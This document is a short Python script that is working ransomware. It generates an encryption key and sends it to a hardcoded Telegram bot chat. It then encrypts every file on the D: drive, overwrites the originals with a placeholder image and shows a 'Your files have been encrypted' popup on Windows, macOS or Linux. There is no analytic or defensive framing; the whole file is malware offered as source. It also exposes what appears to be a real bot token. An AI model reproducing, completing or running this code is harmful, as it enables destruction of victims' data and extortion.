
import os
import asyncio
import telegram
from cryptography.fernet import Fernet
import subprocess
import platform
import shutil

TOKEN = '6580157748:AAFiQFNDGVhusVirWUB44OVde24csBfJQhI'
bot = telegram.Bot(token=TOKEN)

async def send_message(chat_id, text):
    await bot.send_message(chat_id=chat_id, text=text)

def encrypt_file(file_path, cipher):
    with open(file_path, 'rb') as file:
        file_content = file.read()
    encrypted_content = cipher.encrypt(file_content)
    with open(file_path, 'wb') as encrypted_file:
        encrypted_file.write(encrypted_content)

def encrypt_directory(directory, cipher, replacement_image_path):
    for root, directories, files in os.walk(directory):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            try:
                encrypt_file(file_path, cipher)
                os.remove(file_path)
                shutil.copy(replacement_image_path, file_path) 
            except PermissionError:
                asyncio.run(send_message(chat_id='513135594', text='is not down '))
            except Exception as e:
                asyncio.run(send_message(chat_id='513135594', text='is down '))


key = Fernet.generate_key()
cipher = Fernet(key)
asyncio.run(send_message(chat_id='513135594', text=f'Encryption Key: {key.decode()}'))

replacement_image_path = 'test.jpg'  
encrypt_directory('D:\\', cipher, replacement_image_path)

if platform.system() == 'Windows':
    import ctypes
    ctypes.windll.user32.MessageBoxW(None, "Your files have been encrypted.", "Files Encrypted", 0)
elif platform.system() == 'Darwin': # macOS
    popup_command = [
        "osascript",
        "-e",
        "display dialog \"Your files have been encrypted.\" with title \"Files Encrypted\""
    ]
    subprocess.run(popup_command)
elif platform.system() == 'Linux':
    popup_command = [
        "zenity",
        "--info",
        "--text='Your files have been encrypted.'",
        "--title='Files Encrypted'"
    ]
    subprocess.run(popup_command)
else:
    asyncio.run(send_message(chat_id='513135594', text=''))
